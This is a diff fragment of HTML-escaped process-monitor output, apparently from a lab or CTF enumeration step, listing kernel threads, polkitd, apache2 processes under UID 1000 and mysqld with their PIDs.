-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;298    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;297    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;296    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;295    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;294    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;293    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;292    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;291    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;290    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;29     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;288    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;285    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;28     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2762   | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;276    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;266    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;265    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;264    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;263    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;262    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;261    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;25     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;24     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;23     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;22     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;211    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;21     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;20     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;2      | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;195    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;191    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;18     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;179    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;177    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;176    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;175    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;174    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;173    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;172    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;171    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;170    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;17     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;169    |
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;168    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;167    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;166    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;165    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;164    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;163    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;162    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;161    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;160    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;16     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;159    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;158    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;157    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;156    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;155    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;154    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;153    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;152    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;151    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;150    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;15     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;149    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;148    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;147    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;146    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;145    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;144    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;143    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;142    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;141    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;140    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;14     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;137    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;136    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;133    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;132    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;131    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;130    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;13     | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;129    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;128    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;127    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;126    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;125    | 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;12     |
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0    &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1197   | /usr/lib/policykit-1/polkitd &lt;span class=&quot;nt&quot;&gt;--no-debug&lt;/span&gt; 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1168   | /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1167   | /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1166   | /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1165   | /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000 &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1164   | /usr/sbin/apache2 &lt;span class=&quot;nt&quot;&gt;-k&lt;/span&gt; start 
-2022/01/24 04:29:40 CMD: &lt;span class=&quot;nv&quot;&gt;UID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;111  &lt;span class=&quot;nv&quot;&gt;PID&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1163   | /usr/sbin/mysqld &lt;span class=&quot;nt&quot;&gt;--daemonize&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;--pid-file&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;/run/mysqld/mysqld.pid 
